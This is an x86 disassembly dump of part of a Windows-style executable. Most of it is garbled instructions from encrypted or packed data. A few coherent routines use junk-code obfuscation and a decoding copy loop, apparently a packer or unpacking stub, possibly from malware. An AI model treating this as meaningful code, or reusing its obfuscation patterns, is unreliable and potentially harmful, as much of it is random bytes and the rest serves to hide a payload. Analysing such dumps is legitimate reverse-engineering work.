  40a059:	pop    ebp
  40a05a:	cld    
  40a05b:	pop    edi
  40a05c:	push   ebp
  40a05d:	and    al,0xc8
  40a05f:	push   esp
  40a060:	sbb    eax,0xfeca9d7b
  40a065:	mov    ?,WORD PTR [ecx-0x4a07aac9]
  40a06b:	shl    BYTE PTR [eax+0x4d8fe75a],cl
  40a071:	ret    0xe87a
  40a074:	movd   mm6,DWORD PTR [ecx-0x7dbf3d1]
  40a07b:	or     eax,0xe703ee34
  40a080:	and    DWORD PTR [edi],ebp
  40a082:	cmp    edx,DWORD PTR [ecx]
  40a084:	cmp    esi,DWORD PTR [esi+eiz*2]
  40a087:	fbstp  TBYTE PTR [ebp-0x444a1410]
  40a08d:	push   0x19
  40a08f:	inc    esi
  40a090:	cwde   
  40a091:	pusha  
  40a092:	inc    esp
  40a093:	cs pop edx
  40a095:	in     eax,0xa0
  40a097:	icebp  
  40a098:	pop    ecx
  40a099:	xor    DWORD PTR [esi],edi
  40a09b:	mov    edx,0x24c37be6
  40a0a0:	pop    eax
  40a0a1:	rcl    esi,cl
  40a0a3:	and    BYTE PTR [edi],ch
  40a0a5:	dec    edx
  40a0a6:	push   esi
  40a0a7:	imul   edi,DWORD PTR [esi-0x5707f49e],0xf69ba4f3
  40a0b1:	xchg   esi,eax
  40a0b2:	lock xor eax,edi
  40a0b5:	fistp  WORD PTR [ecx-0x3509a435]
  40a0bb:	(bad)  
  40a0bc:	or     cl,BYTE PTR [ebp-0xf52d606]
  40a0c2:	adc    ecx,DWORD PTR [ecx+0x5cd12a53]
  40a0c8:	shr    DWORD PTR [edx-0x26],1
  40a0cb:	imul   ecx,DWORD PTR ds:0xb09e8fb6,0xffffffce
  40a0d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a0d3:	outs   dx,BYTE PTR ds:[esi]
  40a0d4:	data16 add ch,BYTE PTR [esi-0x24]
  40a0d8:	cdq    
  40a0d9:	fst    DWORD PTR [eax+eiz*4-0x40248fb0]
  40a0e0:	mul    cl
  40a0e2:	xchg   BYTE PTR [edx-0x2b85c37c],ch
  40a0e8:	and    DWORD PTR [edx],esi
  40a0ea:	dec    edi
  40a0eb:	call   0x9b50:0xb864ebe9
  40a0f2:	fcomp  st(5)
  40a0f4:	(bad)  
  40a0f5:	cmp    bl,al
  40a0f7:	cmp    eax,0xab3ec043
  40a0fc:	sbb    al,0x2f
  40a0fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a0ff:	pop    ss
  40a100:	and    al,0xe9
  40a102:	mov    edx,0x49afdfd2
  40a107:	dec    edi
  40a108:	ret    
  40a109:	enter  0x3f46,0x60
  40a10d:	fisubr DWORD PTR [ebx]
  40a10f:	in     al,dx
  40a110:	test   eax,0xe046f0bf
  40a115:	loopne 0x40a17c
  40a117:	push   0x1e
  40a119:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a11a:	popa   
  40a11b:	mul    BYTE PTR [eax]
  40a11d:	pop    esp
  40a11e:	dec    edx
  40a11f:	xchg   edi,eax
  40a120:	adc    BYTE PTR [ebp-0x4f],bl
  40a123:	in     al,dx
  40a124:	pop    esp
  40a125:	dec    eax
  40a126:	inc    edi
  40a127:	mov    DWORD PTR [edi-0x4bc0bc8d],esi
  40a12d:	or     BYTE PTR [ebx-0x4de9933a],bh
  40a133:	push   es
  40a134:	rol    DWORD PTR [eax+0x7c400f37],0xc6
  40a13b:	test   ah,ch
  40a13d:	and    al,0xae
  40a13f:	out    0x47,al
  40a141:	pop    eax
  40a142:	and    bl,BYTE PTR [ebp-0x47]
  40a145:	pop    eax
  40a146:	inc    eax
  40a147:	add    ebx,ebx
  40a149:	retf   
  40a14a:	xchg   esi,eax
  40a14b:	sbb    al,0xcd
  40a14d:	mov    cl,0x3b
  40a14f:	(bad)  
  40a150:	shl    BYTE PTR [ebx],cl
  40a152:	fadd   st(0),st
  40a154:	fistp  WORD PTR [ebx]
  40a156:	in     eax,0xe5
  40a158:	sub    DWORD PTR [esi+0x587680ab],esp
  40a15e:	loope  0x40a111
  40a160:	cdq    
  40a161:	add    dh,ah
  40a163:	push   0x7b
  40a165:	in     eax,0xd5
  40a167:	push   0x3c
  40a169:	xlat   BYTE PTR ds:[ebx]
  40a16a:	lods   eax,DWORD PTR ds:[esi]
  40a16b:	or     BYTE PTR [esi],0x57
  40a16e:	and    al,0x5b
  40a170:	xlat   BYTE PTR ds:[ebx]
  40a171:	das    
  40a172:	in     eax,dx
  40a173:	pop    ss
  40a174:	jge    0x40a1e7
  40a176:	sbb    ch,BYTE PTR [ebp-0x4d446f44]
  40a17c:	bound  edx,QWORD PTR [eax-0x2b]
  40a17f:	adc    eax,0x4da863d4
  40a184:	sub    esi,DWORD PTR [eax+0x735e8f94]
  40a18a:	cld    
  40a18b:	ret    0x596
  40a18e:	xchg   esp,eax
  40a18f:	jmp    0x586e6502
  40a194:	pop    ecx
  40a195:	sbb    eax,0x16580a9f
  40a19a:	push   ds
  40a19b:	mov    ecx,0x1fc81b2d
  40a1a0:	ins    DWORD PTR es:[edi],dx
  40a1a1:	jnp    0x40a12f
  40a1a3:	cmp    ecx,DWORD PTR [eax]
  40a1a5:	adc    DWORD PTR [ebx-0x1a364480],edi
  40a1ab:	pop    ebp
  40a1ac:	aam    0x12
  40a1ae:	sub    BYTE PTR [ebx+eax*8+0x2dcaa801],dl
  40a1b5:	(bad)  
  40a1b7:	sbb    dh,bh
  40a1b9:	push   0xc63a9d39
  40a1be:	or     DWORD PTR [ecx+0x1a],ebp
  40a1c1:	icebp  
  40a1c2:	inc    edi
  40a1c3:	sbb    esp,DWORD PTR [ebx-0xaa31ce3]
  40a1c9:	popf   
  40a1ca:	loope  0x40a1cc
  40a1cc:	stos   DWORD PTR es:[edi],eax
  40a1cd:	add    BYTE PTR [ecx+0x61f08ea3],dh
  40a1d3:	dec    edx
  40a1d4:	jmp    0x40a178
  40a1d6:	pop    edi
  40a1d7:	cmc    
  40a1d8:	cmp    cl,BYTE PTR [edi]
  40a1da:	cdq    
  40a1db:	(bad)  
  40a1dc:	mov    eax,ds:0x216ce99
  40a1e1:	push   DWORD PTR [ebx+0x27]
  40a1e4:	sbb    eax,DWORD PTR [ecx+0x49]
  40a1e7:	push   edi
  40a1e8:	and    bh,BYTE PTR [ecx+0x55b85b91]
  40a1ee:	fadd   DWORD PTR [ebx]
  40a1f0:	out    0xa0,eax
  40a1f2:	cmc    
  40a1f3:	in     al,dx
  40a1f4:	inc    edi
  40a1f5:	or     DWORD PTR [esi+0x16],edi
  40a1f8:	ret    0x1d35
  40a1fb:	(bad)  ds:0x850ff03b
  40a201:	push   ss
  40a202:	add    BYTE PTR [eax],al
  40a204:	add    BYTE PTR [ebx+0x758bfc45],cl
  40a20a:	clc    
  40a20b:	xor    eax,edx
  40a20d:	xor    esi,edx
  40a20f:	add    eax,ecx
  40a211:	add    esi,ecx
  40a213:	imul   eax,esi
  40a216:	jmp    0x40a256
  40a21b:	mov    eax,DWORD PTR [ebp+0xc]
  40a21e:	mov    eax,DWORD PTR [eax+0x78]
  40a221:	mov    DWORD PTR [ebp+0xc],eax
  40a224:	mov    eax,DWORD PTR [ebp-0x4]
  40a227:	mov    esi,DWORD PTR [ebp-0x8]
  40a22a:	xor    eax,edx
  40a22c:	xor    esi,edx
  40a22e:	add    eax,ecx
  40a230:	add    esi,ecx
  40a232:	imul   eax,esi
  40a235:	mov    esi,DWORD PTR [ebp+0xc]
  40a238:	cmp    esi,eax
  40a23a:	mov    eax,DWORD PTR [ebp-0x4]
  40a23d:	je     0x40a208
  40a243:	xor    eax,edx
  40a245:	add    eax,ecx
  40a247:	mov    ecx,DWORD PTR [ebp+0xc]
  40a24a:	imul   eax,ecx
  40a24d:	add    eax,DWORD PTR [ebp+0x8]
  40a250:	mov    DWORD PTR [ebp+0xc],eax
  40a253:	mov    eax,DWORD PTR [ebp+0xc]
  40a256:	pop    esi
  40a257:	leave  
  40a258:	ret    0x8
  40a25b:	push   ebp
  40a25c:	mov    ebp,esp
  40a25e:	sub    esp,0x10
  40a261:	sbb    eax,DWORD PTR ds:0x413c88
  40a267:	mov    eax,0xf89c85b0
  40a26c:	xor    edx,edx
  40a26e:	xor    edx,DWORD PTR ds:0x414014
  40a274:	sub    DWORD PTR ds:0x413cf4,edx
  40a27a:	mov    DWORD PTR [ebp-0x4],eax
  40a27d:	add    ecx,ecx
  40a27f:	mov    DWORD PTR [ebp-0x8],0xf89c85b1
  40a286:	or     DWORD PTR ds:0x414014,edi
  40a28c:	mov    ecx,DWORD PTR [ebp-0x4]
  40a28f:	push   esi
  40a290:	mov    edx,0x7510894
  40a295:	add    esi,0x25d7
  40a29b:	xor    ecx,edx
  40a29d:	mov    DWORD PTR ds:0x413d30,0x18
  40a2a7:	cmp    DWORD PTR ds:0x413d30,0x0
  40a2ae:	je     0x40a2e4
  40a2b4:	cmp    DWORD PTR ds:0x413d30,0x19
  40a2bb:	jne    0x40a2cc
  40a2c1:	push   0x413ce8
  40a2c6:	call   DWORD PTR ds:0x41679c
  40a2cc:	mov    esi,DWORD PTR ds:0x413d30
  40a2d2:	dec    esi
  40a2d3:	mov    DWORD PTR ds:0x413d30,esi
  40a2d9:	jmp    0x40a2a7
  40a2de:	add    esi,DWORD PTR ds:0x413d24
  40a2e4:	mov    esi,0x3272dc
  40a2e9:	neg    DWORD PTR ds:0x413d24
  40a2ef:	push   edi
  40a2f0:	mov    edi,DWORD PTR [ebp+0x10]
  40a2f3:	adc    DWORD PTR ds:0x414008,0x741e
  40a2fd:	add    ecx,esi
  40a2ff:	cmp    ecx,edi
  40a301:	mov    DWORD PTR ds:0x413c80,0x1b1e
  40a30b:	je     0x40a474
  40a311:	mov    ecx,DWORD PTR [ebp-0x4]
  40a314:	mov    edi,DWORD PTR [ebp+0x10]
  40a317:	xor    eax,eax
  40a319:	xor    ecx,edx
  40a31b:	adc    DWORD PTR ds:0x413d2c,0x414008
  40a325:	add    ecx,esi
  40a327:	add    edi,0xfabdbeef
  40a32d:	adc    eax,0xffffffff
  40a330:	neg    DWORD PTR ds:0x413c88
  40a336:	xor    eax,0x0
  40a339:	mov    DWORD PTR [ebp-0xc],eax
  40a33c:	push   ebx
  40a33d:	movzx  eax,BYTE PTR ds:0x413d30
  40a344:	adc    DWORD PTR ds:0x414018,eax
  40a34a:	xor    ebx,ebx
  40a34c:	xor    edi,0x8a29a125
  40a352:	mov    eax,ds:0x413c12
  40a357:	and    DWORD PTR ds:0x413cdc,eax
  40a35d:	mov    eax,ecx
  40a35f:	add    eax,0xfabdbeef
  40a364:	mov    DWORD PTR ds:0x413c6c,0x7b3
  40a36e:	adc    ebx,0xffffffff
  40a371:	add    DWORD PTR ds:0x413c88,0x414018
  40a37b:	xor    eax,0x8a29a125
  40a380:	mov    DWORD PTR ds:0x413d18,0x6932
  40a38a:	xor    ebx,0x0
  40a38d:	mov    DWORD PTR ds:0x413cd8,0x53fd
  40a397:	cmp    eax,edi
  40a399:	mov    DWORD PTR ds:0x413c88,0x1215
  40a3a3:	jne    0x40a3c6
  40a3a9:	mov    DWORD PTR ds:0x413c16,0x2565
  40a3b3:	cmp    ebx,DWORD PTR [ebp-0xc]
  40a3b6:	je     0x40a46e
  40a3bc:	jmp    0x40a3c6
  40a3c1:	mov    esi,0x3272dc
  40a3c6:	and    DWORD PTR ds:0x413d30,0x0
  40a3d0:	xor    eax,eax
  40a3d2:	xor    eax,DWORD PTR ds:0x413d30
  40a3d8:	inc    eax
  40a3d9:	mov    ds:0x413d30,eax
  40a3de:	cmp    DWORD PTR ds:0x413d30,0x26
  40a3e5:	jne    0x40a3f9
  40a3eb:	push   0x413d20
  40a3f0:	push   DWORD PTR [ebp-0x10]
  40a3f3:	call   DWORD PTR ds:0x41675c
  40a3f9:	cmp    DWORD PTR ds:0x413d30,0x1f
  40a400:	jb     0x40a3d0
  40a406:	mov    eax,DWORD PTR [ebp-0x4]
  40a409:	mov    edi,DWORD PTR [ebp-0x8]
  40a40c:	xor    edi,edx
  40a40e:	add    edi,esi
  40a410:	mov    esi,DWORD PTR [ebp+0x8]
  40a413:	imul   edi,ecx
  40a416:	mov    ebx,DWORD PTR [ebp+0xc]
  40a419:	xor    eax,edx
  40a41b:	add    eax,ecx
  40a41d:	mov    al,BYTE PTR [ebx+eax*1+0x3272dc]
  40a424:	mov    BYTE PTR [edi+esi*1],al
  40a427:	mov    eax,DWORD PTR [ebp-0x8]
  40a42a:	mov    esi,DWORD PTR [ebp+0x10]
  40a42d:	xor    eax,edx
  40a42f:	xor    ebx,ebx
  40a431:	add    esi,0xfabdbeef
  40a437:	adc    ebx,0xffffffff
  40a43a:	lea    ecx,[ecx+eax*1+0x3272dc]
  40a441:	xor    edi,edi
  40a443:	xor    esi,0x8a29a125
  40a449:	xor    ebx,0x0
  40a44c:	mov    eax,ecx
  40a44e:	add    eax,0xfabdbeef
  40a453:	adc    edi,0xffffffff
  40a456:	xor    eax,0x8a29a125
  40a45b:	xor    edi,0x0
  40a45e:	cmp    eax,esi
  40a460:	jne    0x40a3c1
  40a466:	cmp    edi,ebx
  40a468:	jne    0x40a3c1
  40a46e:	mov    eax,0xf89c85b1
  40a473:	pop    ebx
  40a474:	pop    edi
  40a475:	pop    esi
  40a476:	leave  
  40a477:	ret    0xc
  40a47a:	push   ebp
  40a47b:	mov    ebp,esp
  40a47d:	sub    esp,0xa4
  40a483:	sbb    DWORD PTR ds:0x413cf4,0x6aac
  40a48d:	mov    ecx,DWORD PTR [ebp+0x8]
  40a490:	and    DWORD PTR ds:0x414008,0x0
  40a49a:	mov    eax,ds:0x414008
  40a49f:	inc    eax
  40a4a0:	mov    ds:0x414008,eax
  40a4a5:	cmp    DWORD PTR ds:0x414008,0x6
  40a4ac:	jne    0x40a4c5
  40a4b2:	push   DWORD PTR [ebp-0x18]
  40a4b5:	push   0x41401c
  40a4ba:	push   0x1f9d
  40a4bf:	call   DWORD PTR ds:0x416760
  40a4c5:	cmp    DWORD PTR ds:0x414008,0x5
  40a4cc:	jne    0x40a4dd
  40a4d2:	mov    eax,ds:0x414008
  40a4d7:	inc    eax
  40a4d8:	mov    ds:0x414008,eax
  40a4dd:	cmp    DWORD PTR ds:0x414008,0x1b
  40a4e4:	jb     0x40a49a
  40a4ea:	mov    DWORD PTR ds:0x41401c,0x17
  40a4f4:	cmp    DWORD PTR ds:0x41401c,0x0
  40a4fb:	je     0x40a54c
  40a501:	cmp    DWORD PTR ds:0x41401c,0x6
  40a508:	jne    0x40a524
  40a50e:	push   DWORD PTR [ebp-0x24]
  40a511:	push   0x3b56
  40a516:	push   DWORD PTR [ebp-0x1c]
  40a519:	push   0x73b3
  40a51e:	call   DWORD PTR ds:0x416764
  40a524:	cmp    DWORD PTR ds:0x41401c,0x7
  40a52b:	jne    0x40a53c
  40a531:	mov    eax,ds:0x41401c
  40a536:	dec    eax
  40a537:	mov    ds:0x41401c,eax
  40a53c:	mov    eax,ds:0x41401c
  40a541:	dec    eax
  40a542:	mov    ds:0x41401c,eax
  40a547:	jmp    0x40a4f4
  40a54c:	mov    eax,0x8a87
  40a551:	xor    ax,WORD PTR [ecx+0x20]
  40a555:	not    DWORD PTR ds:0x413cf4
  40a55b:	mov    ecx,0x3b4a
  40a560:	adc    DWORD PTR ds:0x413c0a,0x414008
  40a56a:	add    ax,cx
  40a56d:	movzx  eax,ax
  40a570:	mov    DWORD PTR [ebp-0x18],eax
  40a573:	mov    ecx,DWORD PTR ds:0x413c78
  40a579:	sbb    DWORD PTR ds:0x413d28,ecx
  40a57f:	mov    BYTE PTR [ebp-0x1],0x7d
  40a583:	add    ecx,DWORD PTR ds:0x414000
  40a589:	lea    eax,[ebp-0x1]
  40a58c:	xor    DWORD PTR ds:0x413c78,ecx
  40a592:	mov    DWORD PTR [ebp-0x10],eax
  40a595:	add    DWORD PTR ds:0x413d1c,0x4151
  40a59f:	mov    al,BYTE PTR [ebp-0x1]
  40a5a2:	mov    ecx,DWORD PTR [ebp-0x10]
  40a5a5:	or     DWORD PTR ds:0x413d20,0x66e0
  40a5af:	xor    al,0x70
  40a5b1:	and    DWORD PTR ds:0x414000,0x34d9
  40a5bb:	sub    al,0xc
  40a5bd:	and    DWORD PTR ds:0x413d1c,0x413c70
  40a5c7:	mov    BYTE PTR [ecx],al
  40a5c9:	mov    DWORD PTR [ebp-0x14],0xf89c85b0
  40a5d0:	or     DWORD PTR ds:0x413ce0,ecx
  40a5d6:	push   ebx
  40a5d7:	jmp    0x40c95f
  40a5dc:	and    ch,BYTE PTR ds:0xb393b193
  40a5e2:	add    cl,BYTE PTR [edi-0x6bf6fe89]
  40a5e8:	xor    al,0x69
  40a5ea:	cdq    
  40a5eb:	in     eax,0x27
  40a5ed:	push   es
  40a5ee:	jl     0x40a66c
  40a5f0:	pop    es
  40a5f1:	pop    edi
  40a5f2:	jl     0x40a670
  40a5f4:	loopne 0x40a5dd
  40a5f6:	xchg   BYTE PTR [ebx+0x62],dl
  40a5f9:	mov    al,0x78
  40a5fb:	es dec edi
  40a5fd:	jno    0x40a5cf
  40a5ff:	popf   
  40a600:	ins    DWORD PTR es:[edi],dx
  40a601:	div    DWORD PTR ds:0x2770a9c3
  40a607:	jno    0x40a5f5
  40a609:	test   BYTE PTR [eax],ch
  40a60b:	int3   
  40a60c:	mov    DWORD PTR [edi+0x8983b76],edi
  40a612:	cmp    esi,DWORD PTR [eax]
  40a614:	stos   DWORD PTR es:[edi],eax
  40a615:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a616:	xor    al,BYTE PTR [ecx+0x2d021fe9]
  40a61c:	ds dec ebp
  40a61e:	sti    
  40a61f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a620:	daa    
  40a621:	leave  
  40a622:	push   ss
  40a623:	ret    0x52a2
  40a626:	jecxz  0x40a5eb
  40a628:	neg    DWORD PTR [eax-0x2]
  40a62b:	jg     0x40a614
  40a62d:	fild   QWORD PTR [edi]
  40a62f:	add    al,0x5a
  40a631:	enter  0xd1b2,0x21
  40a635:	popf   
  40a636:	push   cs
  40a637:	ret    
  40a638:	(bad)  
  40a639:	repnz bound edx,QWORD PTR [ebp-0x54]
  40a63d:	aas    
  40a63e:	or     DWORD PTR [ecx+eax*2],ebp
  40a641:	(bad)  
  40a642:	fdiv   DWORD PTR [ebx]
  40a644:	retf   0x4888
  40a647:	leave  
  40a648:	test   ah,cl
  40a64a:	retf   
  40a64b:	add    eax,0xf17f44d3
  40a650:	shl    BYTE PTR [eax+0x44],1
  40a653:	push   eax
  40a654:	push   esi
  40a655:	aaa    
  40a656:	jb     0x40a692
  40a658:	mov    cl,0xc4
  40a65a:	or     al,0x76
  40a65c:	sbb    bl,ch
  40a65e:	cli    
  40a65f:	xor    BYTE PTR [esi],dl
  40a661:	ins    DWORD PTR es:[edi],dx
  40a662:	in     eax,dx
  40a663:	mov    WORD PTR [edx],?
  40a665:	sub    eax,ebp
  40a667:	and    eax,0xdef9a30d
  40a66c:	rol    BYTE PTR [ecx+0x7065dbe5],cl
  40a672:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a673:	cwde   
  40a674:	inc    esp
  40a675:	lods   eax,DWORD PTR gs:[esi]
  40a677:	jo     0x40a626
  40a679:	inc    ebp
  40a67a:	jle    0x40a608
  40a67c:	out    dx,al
  40a67d:	cmp    al,0xd6
  40a67f:	(bad)  
  40a680:	pop    ebx
  40a681:	int3   
  40a682:	push   0x9b74946b
  40a687:	jmp    0xb38a:0xa5b92f73
  40a68e:	in     eax,0x2c
  40a690:	mov    DWORD PTR [eax+0x3d6588b4],0x497e1b21
  40a69a:	call   DWORD PTR [edx]
  40a69c:	mov    al,ds:0x13b26fea
  40a6a1:	fs jle 0x40a6dd
  40a6a4:	pop    ebp
  40a6a5:	pushf  
  40a6a6:	mul    DWORD PTR [edx+edx*4]
  40a6a9:	xchg   ecx,eax
  40a6aa:	loopne 0x40a70f
  40a6ac:	ret    0x7b5e
  40a6af:	push   ebx
  40a6b0:	lods   eax,DWORD PTR ds:[esi]
  40a6b1:	ds and edx,0xffffff96
  40a6b5:	sbb    eax,0xe9ebee23
  40a6ba:	jge    0x40a72f
  40a6bc:	cmp    al,0x4f
  40a6be:	leave  
  40a6bf:	(bad)  
  40a6c0:	or     eax,0xe05eef75
  40a6c5:	aas    
  40a6c6:	(bad)
  40a6c9:	int3   
  40a6ca:	jmp    0xd7a2:0xe2567629
  40a6d1:	inc    esi
  40a6d2:	dec    eax
  40a6d3:	mov    esp,0x9377f94a
  40a6d8:	mov    ecx,0x164655b9
  40a6dd:	dec    eax
  40a6de:	loope  0x40a707
  40a6e0:	fwait
  40a6e1:	imul   eax,DWORD PTR [esi+0x3],0x94c5a4d6
  40a6e8:	jbe    0x40a742
  40a6ea:	jbe    0x40a767
  40a6ec:	ins    DWORD PTR es:[edi],dx
  40a6ed:	cli    
  40a6ee:	lea    eax,[edi-0x1a902040]
  40a6f4:	mov    al,ds:0x266074f2
  40a6f9:	loop   0x40a718
  40a6fb:	adc    eax,0xd9d039c5
  40a700:	(bad)  
  40a701:	adc    ebx,DWORD PTR [eax-0x45]
  40a704:	or     edx,DWORD PTR [edi-0x228144f6]
  40a70a:	push   0x42
  40a70c:	mov    ecx,0x6d10fb12
  40a711:	sti    
  40a712:	inc    BYTE PTR [edx+0x16fb415]
  40a718:	call   0x8e0c:0x5bc25f14
  40a71f:	xor    DWORD PTR [edx+0x13472815],ebx
  40a725:	(bad)  
  40a726:	(bad)  [ebp-0x40ed6cd7]
  40a72c:	div    BYTE PTR [ebx+0x5bff2fb9]
  40a732:	fild   WORD PTR [edi+esi*2-0x37]
  40a736:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a737:	aam    0x5
  40a739:	adc    al,BYTE PTR [eax+ecx*1]
  40a73c:	sub    al,al
  40a73e:	sbb    al,0x11
  40a740:	aad    0x4f
  40a742:	aas    
  40a743:	arpl   WORD PTR [ebx+0x483f401a],cx
  40a749:	cdq    
  40a74a:	pop    ecx
  40a74b:	xchg   ebx,eax
  40a74c:	adc    ebp,DWORD PTR [eax-0x49d40b81]
  40a752:	fcomp  QWORD PTR [esi+0x36]
  40a755:	punpckhbw mm7,QWORD PTR [esi-0x3f6f06d1]
  40a75c:	inc    edi
  40a75d:	xchg   eax,eax
  40a75f:	cwde   
  40a760:	vandpd xmm1,xmm1,xmm3
  40a764:	pop    eax
  40a765:	cdq    
  40a766:	push   eax
  40a767:	fwait
  40a768:	pop    es
  40a769:	cmp    BYTE PTR [edi-0x6e8dbc81],dl
  40a76f:	push   ebx
  40a770:	jno    0x40a7ec
  40a772:	xchg   DWORD PTR [edx-0x77],ebx
  40a775:	aas    
  40a776:	pushf  
  40a777:	inc    ebx
  40a778:	sbb    BYTE PTR [edi],dh
  40a77a:	leave  
  40a77b:	(bad)  
  40a77c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a77d:	dec    ecx
  40a77e:	(bad)  
  40a77f:	je     0x40a781
  40a781:	jle    0x40a771
  40a783:	(bad)  
  40a784:	mov    esi,0xd17f5237
  40a789:	out    dx,eax
  40a78a:	(bad)  [ebp+0x54e62330]
  40a790:	rcl    BYTE PTR [edi+edi*4-0x5f5e5619],cl
  40a797:	test   al,0x55
  40a799:	mov    BYTE PTR [edi-0x4796ed7f],al
  40a79f:	fcmovb st,st(5)
  40a7a1:	sbb    edi,ebx
  40a7a3:	imul   ebx,DWORD PTR [edx-0x4fb9d47f],0xffffffb6
  40a7aa:	pop    es
  40a7ab:	dec    edi
  40a7ac:	push   ebp
  40a7ad:	fbld   TBYTE PTR [esi+0x749bfdb0]
  40a7b3:	scas   al,BYTE PTR es:[edi]
  40a7b4:	mov    edx,0xee6f6085
  40a7b9:	addr16 push edx
  40a7bb:	sub    ebx,ebx
  40a7bd:	jns    0x40a750
  40a7bf:	push   edx
  40a7c0:	jg     0x40a7df
  40a7c2:	scas   eax,DWORD PTR es:[edi]
  40a7c3:	jno    0x40a82a
  40a7c5:	sar    DWORD PTR [ecx],cl
  40a7c7:	and    ecx,DWORD PTR [ebx-0x48]
  40a7ca:	popf   
  40a7cb:	jbe    0x40a75b
  40a7cd:	bound  edi,QWORD PTR [eax-0x4d]
  40a7d0:	jecxz  0x40a807
  40a7d2:	jle    0x40a792
  40a7d4:	pop    edx
  40a7d5:	sub    esp,DWORD PTR [ecx+ecx*2+0x62]
  40a7d9:	les    edi,FWORD PTR [edi-0x8]
  40a7dc:	iret   
  40a7dd:	xchg   ebp,eax
  40a7de:	imul   esp,DWORD PTR [eax-0x490f1dfb],0xffffffdf
  40a7e5:	sahf   
  40a7e6:	inc    esp
  40a7e7:	sbb    ch,BYTE PTR [ebx-0x2c]
  40a7ea:	pop    ds
  40a7eb:	dec    esp
  40a7ec:	mov    bl,0x77
  40a7ee:	loopne 0x40a77a
  40a7f0:	sbb    edi,ecx
  40a7f2:	test   al,0x7b
  40a7f4:	(bad)  
  40a7f5:	loope  0x40a85d
  40a7f7:	dec    edi
  40a7f8:	aad    0x22
  40a7fa:	or     WORD PTR [edi+esi*1+0x7b],di
  40a7ff:	lods   eax,DWORD PTR ds:[si]
  40a801:	call   FWORD PTR [eax-0x3a]
  40a804:	pop    es
  40a805:	ret    0xcb34
  40a808:	push   ecx
  40a809:	jno    0x40a7e0
  40a80b:	ins    BYTE PTR es:[edi],dx
  40a80c:	cmp    eax,esp
  40a80e:	cmp    ax,0x9864
  40a812:	and    eax,0xa0cfb07e
  40a817:	and    eax,0xcf31c199
  40a81c:	aad    0x28
  40a81e:	adc    esp,esp
  40a820:	or     eax,0x5f75aec0
  40a825:	mov    cl,0xc2
  40a827:	(bad)  
  40a828:	icebp  
  40a829:	sub    dl,BYTE PTR [edx+0x1d]
  40a82c:	outs   dx,DWORD PTR ds:[esi]
  40a82d:	adc    DWORD PTR [eax],esi
  40a82f:	xor    al,0x1
  40a831:	mov    ds:0x5c766835,al
  40a836:	xchg   ebp,eax
  40a837:	in     al,0xfd
  40a839:	pop    ss
  40a83a:	add    DWORD PTR [eax-0x598e8b14],ecx
  40a840:	scas   eax,DWORD PTR es:[edi]
  40a841:	pop    es
  40a842:	lahf   
  40a843:	xchg   DWORD PTR [esi-0x39900775],ebp
  40a849:	push   esp
  40a84a:	outs   dx,BYTE PTR ds:[esi]
  40a84b:	mov    dh,0x8
  40a84d:	push   ss
  40a84e:	push   ds
  40a84f:	cwde   
  40a850:	xchg   edx,eax
  40a851:	sti    
  40a852:	push   esp
  40a853:	inc    ebp
  40a854:	lahf   
  40a855:	jmp    0xa5081ee5
  40a85a:	jbe    0x40a8ab
  40a85c:	adc    eax,0xd9b62f73
  40a861:	sti    
  40a862:	add    BYTE PTR [ebx],al
  40a864:	(bad)  
  40a865:	(bad)  
  40a866:	(bad)  
  40a867:	std    
  40a868:	xor    bl,cl
  40a86a:	ret    0x2763
  40a86d:	xor    DWORD PTR [ecx],edi
  40a86f:	xor    bh,BYTE PTR [ebx+0x2e]
  40a872:	jge    0x40a80b
  40a874:	push   ds
  40a875:	aaa    
  40a876:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a877:	adc    al,0xf4
  40a879:	fmul   QWORD PTR [ebx+0x97efb03]
  40a87f:	or     ebx,DWORD PTR [edx-0x52b810db]
  40a885:	mov    dl,0x10
  40a887:	dec    edi
  40a888:	push   0xffffffd9
  40a88a:	dec    eax
  40a88b:	retf   
  40a88c:	cmp    BYTE PTR [edx],dh
  40a88e:	jmp    0x6826:0xd9cf6f37
  40a895:	outs   dx,BYTE PTR ds:[esi]
  40a896:	int    0x27
  40a898:	test   al,0xa0
  40a89a:	sub    eax,0x4627a415
  40a89f:	bound  esp,QWORD PTR [ebx+0x4d]
  40a8a2:	sahf   
  40a8a3:	ret    
  40a8a4:	scas   al,BYTE PTR es:[edi]
  40a8a5:	outs   dx,BYTE PTR ds:[esi]
  40a8a6:	icebp  
  40a8a7:	retf   0x5e6e
  40a8aa:	and    al,0xfa
  40a8ac:	jns    0x40a92c
  40a8ae:	and    DWORD PTR [ebx-0x60ae0373],edx
  40a8b4:	mov    ebp,0x8af93c51
  40a8b9:	call   0x69fe8fd7
  40a8be:	fs sbb eax,0x81600e7f
  40a8c4:	jo     0x40a8e8
  40a8c6:	cdq    
  40a8c7:	fdivr  QWORD PTR [eax+ecx*1+0x6b7de48a]
  40a8ce:	in     eax,0xd4
  40a8d0:	mov    cl,0x6c
  40a8d2:	xor    DWORD PTR [esi+0x445cd389],eax
  40a8d8:	jp     0x40a89a
  40a8da:	xor    BYTE PTR [ecx-0x7baf65fe],ah
  40a8e0:	aas    
  40a8e1:	dec    ecx
  40a8e2:	scas   eax,DWORD PTR es:[edi]
  40a8e3:	pop    eax
  40a8e4:	push   edi
  40a8e5:	xor    eax,0xe5f86157
  40a8ea:	(bad)  
  40a8ec:	push   edi
  40a8ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a8ee:	loope  0x40a879
  40a8f0:	add    eax,0xb44c65d6
  40a8f5:	push   edx
  40a8f6:	pop    eax
  40a8f7:	and    eax,0x7ceb08c5
  40a8fc:	jmp    0x997f:0xbc349795
  40a903:	cwde   
  40a904:	or     al,0xe7
  40a906:	and    BYTE PTR [edi],ah
  40a908:	push   cs
  40a909:	js     0x40a917
  40a90b:	clc    
  40a90c:	sub    BYTE PTR [edx-0x56],bl
  40a90f:	gs in  eax,0x4a
  40a912:	mov    ah,0xce
  40a914:	cmp    DWORD PTR [ecx+0x3c6cc260],edi
  40a91a:	push   eax
  40a91b:	cmc    
  40a91c:	int    0x37
  40a91e:	out    0x48,al
  40a920:	and    eax,0x4d1fcd80
